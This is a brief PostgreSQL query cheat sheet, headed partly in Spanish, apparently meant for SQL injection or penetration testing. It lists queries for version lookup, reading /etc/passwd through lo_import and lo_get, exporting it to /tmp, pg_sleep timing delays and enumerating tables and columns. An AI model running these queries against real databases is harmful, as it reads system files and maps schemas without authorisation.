
      ### Información de la versión
        SELECT version()

      ### Import file as large object
        SELECT lo_import('/etc/passwd', 12345);

      ### Read large object
        SELECT lo_get(12345);

      ### Export large object to file
        SELECT lo_export(12345, '/tmp/passwd');

      ### Time delays
        SELECT pg_sleep(10)

      ### Listado de tablas
        SELECT * FROM information_schema.tables

      ### Listado de columnas
        SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'